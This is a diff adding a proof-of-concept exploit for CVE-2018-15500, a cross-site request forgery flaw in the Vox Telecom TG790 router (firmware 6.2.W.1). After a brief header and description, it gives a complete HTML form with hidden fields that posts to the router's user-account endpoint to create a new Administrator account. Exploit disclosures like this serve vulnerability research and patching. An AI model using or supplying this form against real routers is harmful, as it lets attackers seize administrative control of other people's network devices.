@@ -1,0 +1,27 @@
+# Title: Vox TG790 Router - Cross-Site Request Forgery (Add Admin)
+# Author: Cakes
+# Date: 2018-08-01
+# Vendor: VoxTelecom
+# Homepage: www.voxtelecom.co.za
+# Software version: 6.2.W.1
+# CVE: 2018-15500 
+
+# Description:
+# A CSRF issue was discovered on Vox Telecom South Africa TG790 Router 6.2.W.1 devices.
+# Due to improper session validation, an attacker is able to send a
+# specially crafted GET request and create a new Administrator account
+# on the router from a low privilege user account.
+
+<html>
+<form action="https://192.168.1.254/cgi/b/users/cfg/usraccedit/?be=0&l0=2&l1=9&tid=ADD_USER" method="POST">
+<input type="hidden" name="0" id="0" value="10">
+<input type="hidden" name="1" id="1" value="usrAccApply">
+<input type="hidden" name="34" id="34" value="NewUser">
+<input type="hidden" name="36" id="36" value="1">
+<input type="text" name="33" id="33" placeholder="Account Name">
+<br />
+<input type="text" name="31" id="31" value="Administrator">
+<br />
+<input type="submit" value="W00ts">
+</form>
+</html>
